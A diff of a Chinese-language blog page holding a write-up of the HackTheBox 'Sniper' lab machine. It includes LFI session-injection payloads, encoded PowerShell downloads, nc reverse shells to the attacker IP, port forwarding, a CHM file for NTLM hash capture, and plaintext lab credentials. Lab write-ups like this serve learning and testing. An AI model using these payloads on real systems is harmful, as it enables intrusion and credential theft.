@@ -468,8 +468,30 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/-1.PNG" class="lazyload" data-srcset="-1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>攻击机ip： kalilinux 10.10.15.189<br>靶机ip windows10 10.10.10.151 </p>
 <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先是老套的端口扫描</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.151</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 996 filtered ports</span><br><span class="line">PORT    STATE SERVICE       VERSION</span><br><span class="line">80/tcp  open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Sniper Co.</span><br><span class="line">135/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp open  microsoft-ds?</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: 7h02m38s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-04-01T08:23:29</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CST
+Nmap scan report for 10.10.10.151
+Host is up (0.24s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
+Host script results:
+|_clock-skew: 7h02m38s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-04-01T08:23:29
+|_  start_date: N/A
+</code></pre>
 <p>可以看到是一台windows靶机，配有IIS服务。不过开启的几个端口中包含了445端口,这是SMB服务开放的端口。</p>
 <blockquote>
 <p>port 445: Microsoft Windows SMB Server远程代码执行漏洞</p>
@@ -477,53 +499,68 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>著名的永恒之蓝漏洞也是通过这一端口利用的。当然这里并没有什么渗透点，只是说明我们可以通过smbserver连接到靶机,尝试基本的smb连接的话发现必然是要密码的。</p>
 <p>那么还是从80端口入手。访问网页，发现是php网页。IIS+php实际上是非常奇怪的配置,但我们显然可以以此为入手点。</p>
 <h2 id="LFI-RFI-gt-命令执行-gt-webshell"><a href="#LFI-RFI-gt-命令执行-gt-webshell" class="headerlink" title="LFI/RFI=&gt;命令执行=&gt;webshell"></a>LFI/RFI=&gt;命令执行=&gt;webshell</h2><p>首先在blog下发现一个语言切换功能，其参数可以文件包含。<code>/blog?lang=blog-en.php</code><br>尝试伪协议等常规套路读源码均以失败告终。<br>简单读windows的文件<code>?lang=/windows/system32/license.rtf</code><br>发现有回显。那么现在目的是得到一个web-root的shell，如何操作呢？<br>此时有一种相对”简单”的办法,利用上面提到的是smb服务。我们再本机kali新建一个smb服务，然后直接rfi进行操作。<br>RFI的基本操作套路如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?lang&#x3D;\\10.10.14.62\share\foo.php</span><br></pre></td></tr></table></figure>
-<p>但是需要注意。想通过SMB达成rfi我们必须修改本机的是smb服务的权限,控制文件夹的权限为777等等，操作起来对我这样的小白而言相对困难了。那么有没有其他方法得到webshell呢?</p>
+<pre><code>/?lang=\\10.10.14.62\share\foo.php</code></pre><p>但是需要注意。想通过SMB达成rfi我们必须修改本机的是smb服务的权限,控制文件夹的权限为777等等，操作起来对我这样的小白而言相对困难了。那么有没有其他方法得到webshell呢?</p>
 <p>有,而这也是我学到的不同于常规套路的方法。<br>回到之前php网页的思路上。有这样的一个细节可以注意：这是一个windows靶机的php服务，其session值被存储在固定的文件夹了。<br>我们尝试一下随意注册一个用户名，并且记录下session值。通过下面的payload包含session</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lang&#x3D;&#x2F;Windows&#x2F;Temp&#x2F;sess_1d6bfk00vc159thng1t5q521qg</span><br></pre></td></tr></table></figure>
-<p>此时查看包含的结果，发现是含有用户名的序列化数据。那么类似于之前tp5的session固定存储类的漏洞，我们可以从这里下手，将php代码写入session数据。</p>
+<pre><code>lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg</code></pre><p>此时查看包含的结果，发现是含有用户名的序列化数据。那么类似于之前tp5的session固定存储类的漏洞，我们可以从这里下手，将php代码写入session数据。</p>
 <p>首先尝试简单的fuzz,发现用户名过滤了一些关键字。这里直接给出可行的payload及回显</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`whoami`<span class="meta">?&gt;</span></span><br><span class="line">lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg</span><br><span class="line">username|s:<span class="number">13</span>:<span class="string">"nt authority\iusr</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?=`whoami`?&gt;
+lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qg
+username|s:13:&quot;nt authority\iusr</code></pre>
 <p>利用短标签加反引号直接执行命令。可以看到成功执行whoami。<br>接下来可以写webshell,也可以直接命令执行。这里直接进行命令执行。</p>
 <p>尝试常规的powershell反弹shell失败。之后会发现可能是因为powershell运行在constraintmode的原因。但是不要紧，利用lfi+命令执行我们还有其他方法拿到windows靶机的shell。<br>首先找到本机的netcat(即平时使用的nc),把它传到windows机上。(当然需要先建好www文件夹,并把本机的nc.exe复制到里面)<br>payload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo &#39;wget 10.10.15.189/nc.exe -O \windows\temp\exp.exe&#39; | iconv -t utf-16le | base64 -w 0</code></pre>
 <p>将准备好的payload进行编码避免过滤。<br>注册新用户名为</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=`powershell /enc &#123;your encoded  command &#125;`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?=`powershell /enc {your encoded  command }`?&gt;</code></pre>
 <p>这里使用/enc是powershell对应的解码flag,没使用-enc是为了解决过滤问题。<br>然后包含对应的用户的session即可执行。<br>再利用lfi检查是否已经把nc传上去了<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>很好。那么再进行反弹shell的命令吧。<br>payload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">echo &#39;c:\windows\temp\exp.exe 10.10.15.189 8899 -e powershell&#39; | iconv -t utf-16le | base64 -w 0</code></pre>
 <p>本机监听8899.浏览器包含,并得到webshell</p>
 <p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="user-shell"><a href="#user-shell" class="headerlink" title="user shell"></a>user shell</h2><p>拿到webshell后我们首先检查下源码。很快就有所发现<br>\user\db.php中可以发现一个数据库的密码<code>36mEAhz/B8xQ~2VM</code>.而且在User中可以发现用户Chris的存在。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>下面尝试拿到usershell.<br>这里将再次用到我们之前使用过的端口转发。不过需要一个工具来帮助我们实现。<br><a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">https://github.com/jpillora/chisel</a><br>从githubrelease处下载chisel的linux与windows版本。分别用于本机与靶机。然后wget把windows版本的传输到靶机上。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali: chmod +x chisel_linux_amd64</span><br><span class="line">./chisel_linux_amd64 server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line">shell: wget http://10.10.15.189/chisel.exe -O chisel.exe</span><br><span class="line">	</span><br><span class="line">portforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">kali: chmod +x chisel_linux_amd64
+./chisel_linux_amd64 server -p 8000 --reverse
+
+shell: wget http://10.10.15.189/chisel.exe -O chisel.exe
+
+portforwarding: .\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306  </code></pre>
 <p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>开启<code>--reverse</code>允许我们转发端口。而最后一步我们把5985与3306端口转发到本地。5985对应的是WinRM服务，可用于远程管理。我们把它转发到本地后，可以利用另一个渗透工具evil-winrm进行用户登录。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Hackplayers/evil-winrm</span><br><span class="line">sudo gem install winrm winrm-fs stringio</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">git clone https://github.com/Hackplayers/evil-winrm
+sudo gem install winrm winrm-fs stringio</code></pre>
 <p>只需两步即可使用。<br>然后evil-winrm继续登录，直接本地127.0.0.1即可。因为我们端口已经转发好了。<br><code>./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1</code><br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>拿到usershell.</p>
 <p>之所以用这么多工具进行user的提权其实是因为这里想要通过其他方法得到usershell要再次反弹shell.<br>并且操作起来有点麻烦.这里我简单提一下，就是直接通过powershell命令创建一个属于Chris的变量，然后再反弹shell.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = convertto-securestring <span class="string">'36mEAhz/B8xQ~2VM'</span> -asplaintext -force</span><br><span class="line"><span class="variable">$cred</span> = new-object system.management.automation.pscredential(<span class="string">"sniper\chris"</span>, <span class="variable">$pass</span>)</span><br><span class="line">invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">$pass = convertto-securestring &#39;36mEAhz/B8xQ~2VM&#39; -asplaintext -force
+$cred = new-object system.management.automation.pscredential(&quot;sniper\chris&quot;, $pass)
+invoke-command -computer sniper -scriptblock { whoami } -credential $cred</code></pre>
 <p>变量成功创建的话，最后一条命令的回显应该是<code>sniper\chris</code><br>然后下面的命令可以重新弹shell，得到usershell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-command -computer sniper -scriptblock &#123; c:\windows\temp\exp.exe 10.10.15.189 1234 -e powershell.exe &#125; -credential <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
-
-
-
+<pre><code class="bash">invoke-command -computer sniper -scriptblock { c:\windows\temp\exp.exe 10.10.15.189 1234 -e powershell.exe } -credential $cred</code></pre>
 <h2 id="rootshell"><a href="#rootshell" class="headerlink" title="rootshell"></a>rootshell</h2><p>那么又到了最后的root提权时间。<br>在C:\docs中可以发现这样一个有趣的txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hi Chris,</span><br><span class="line">Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.</span><br><span class="line">And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.</span><br><span class="line">Regards,</span><br><span class="line">Sniper CEO.</span><br></pre></td></tr></table></figure>
-<p>有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？<br>同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" class="lazyload" data-srcset="4.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.windows本机下操作生成chm文件</span><br><span class="line">2.上传chm文件,其中payload将打到本机 #类似xss的道理</span><br><span class="line">3.监听本机，得到administrator信息。</span><br></pre></td></tr></table></figure>
+<pre><code>  Hi Chris,
+  Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.
+  And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.
+  Regards,
+  Sniper CEO.</code></pre><p>有意思。似乎在提示我们,传到这个文件夹下的东西可能会被CEO检测。这也就类似xss中我们的payload被检查时可以打到admin的cookie.这里我们是否也能通过可执行文件让administrator检查,拿到administrator的权限呢？<br>同样在Chris的Downloads目录下我们发现一个instructions.chm文件。拿到windows本机打开,将发现<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/4.5.PNG" class="lazyload" data-srcset="4.5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>那么我们应该就是要使用chm文件进行操作了。同时利用的思路也大致清楚了：</p>
+<pre><code>1.windows本机下操作生成chm文件
+2.上传chm文件,其中payload将打到本机 #类似xss的道理
+3.监听本机，得到administrator信息。</code></pre><p>简单提下chm文件。其实就是html文件的帮助文件系统。而且想要操作起来很简单,只要在win10电脑的<code>C:\Program Files (x86)\HTML Help Workshop</code>中即可找到。<br>当然我们还要从微软官网下载最新的<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>先创建一个html文件</p>
+<pre><code class="javascript">&lt;html&gt;
+&lt;body&gt;
+&lt;h1&gt;Hacked by byc_404&lt;/h1&gt;
+&lt;img src=\\10.10.15.189\htb\23333.jpg/&gt;
 
-<p>简单提下chm文件。其实就是html文件的帮助文件系统。而且想要操作起来很简单,只要在win10电脑的<code>C:\Program Files (x86)\HTML Help Workshop</code>中即可找到。<br>当然我们还要从微软官网下载最新的<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21138" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=21138</a><br>先创建一个html文件</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Hacked by byc_404&lt;<span class="regexp">/h1&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=\\10.10.15.189\htb\23333.jpg/</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
 <p>里面的src资源指向我们本机任意资源，说白了就是让admin触发且我们能收到请求而已。<br>在windows本机以管理员权限打开hhw.exe，创建test.hpp项目添加我们刚刚的index.html并编译，即可生成一个chm文件。<br>然后回到本机,先起一个监听<br><code>responder -I tun0</code></p>
 <p>wget上传文件到docs文件夹下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.15.189/test.chm -O exp.chm</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">wget http://10.10.15.189/test.chm -O exp.chm</code></pre>
 <p>很快就能收到请求<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>这是一串管理员密码的hash.到网站上解码可得管理员密码<code>butterfly!#1</code>.</p>
 <p>然后登尝试登陆。由于开放了445端口，我们直接用smb服务可以直接登录。<br>当然我没有起smb服务，使用下面github上的python脚本即可替代。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket   </span><br><span class="line">pip install .</span><br><span class="line">python psexec.py Administrator@10.10.10.151</span><br></pre></td></tr></table></figure>
-<p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<pre><code>git clone https://github.com/SecureAuthCorp/impacket   
+pip install .
+python psexec.py Administrator@10.10.10.151</code></pre><p><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>成功拿到rootshell.</p>
 <p>当然还有类似前面的直接反弹rootshell的方法。因为chm文件甚至可以插入powershell命令，所以我们可以直接生成反弹shell的html.这里直接借用看到的dalao的chm。<br><img src="/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>或者使用powershell命令生成payload<br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Out-CHM –Payload <span class="string">"C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe"</span> –HHCPath “C:\Program Files (x86)\HTML Help Workshop”</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">Out-CHM –Payload &quot;C:windows\temp\exp.exe 10.10.15.189 6666 -e powershell.exe&quot; –HHCPath “C:\Program Files (x86)\HTML Help Workshop”</code></pre>
 <p>这样就能直接在administrator检查时反弹到shell.</p>
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次windows靶机的体验还算不错。因为不熟悉的原因接触了不少新知识。有很多细节还没弄明白，但是也学到了不少windows靶机新知识。的确，CTFer 不能总是待在舒适区。国际赛也好，htb靶机渗透也好，都是接触非国内渗透知识的大好途径。毕竟也打了一段时间比赛了，国内的比赛除了大型比赛能有很多新姿势以及新想法学以外，其他的出题思路或者赛事操作都是老生常谈，拘泥于php或者个别trick的泥潭中。这几天尝试了java题，windows题，都算是一种突破常规的尝试吧。希望自己也能成为有想法的CTFer。而不是一个单纯的CTF赛棍.</p>
 
@@ -733,7 +770,7 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
       
     
       
-        <div><p>博客內容遵循 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh_TW" target="_blank" rel="noopener">姓名標示-非商業性-相同方式分享 4.0 國際 (CC BY-NC-SA 4.0) 協議</a></p>
+        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
 </div>
       
     
@@ -745,9 +782,9 @@ NetCorp这个周末最大的收获就是做了几道java题，对java题的相�
       
     
       
-        本站使用
+        Use
         <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/" target="_blank" class="codename">Volantis</a>
-        作為主題
+        as theme
       
     
       
@@ -880,6 +917,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   
   
+  
+  loadCSS("https://cdn.jsdelivr.net/npm/highlight.js@11.5.0/styles/atom-one-dark.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1093,7 +1132,7 @@ var loadCSS = function( href, before, media, attributes ){
       path = defaultPath || decodeURI(window.location.pathname);
     }
     var valine = new Valine();
-    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
+    valine.init(Object.assign({"path":null,"placeholder":"快来评论吧~","appId":"pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz","appKey":"9HlyBGu0qm9EmkSNKD2qoBx4","meta":["nick","mail","link"],"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":true,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false}, {
       el: '#valine_container',
       path: path,
       placeholder: pagePlaceholder,
@@ -1149,6 +1188,23 @@ function setSearchService() {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.highlightAll()</script>
+<script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js@2.8.0/dist/highlightjs-line-numbers.min.js"></script>
+<script>hljs.initLineNumbersOnLoad({ singleLine: true });</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	  hljs.lineNumbersBlock(block, {  singleLine: true });
+	});
+},"highlightjs")
+</script>
 
 
 
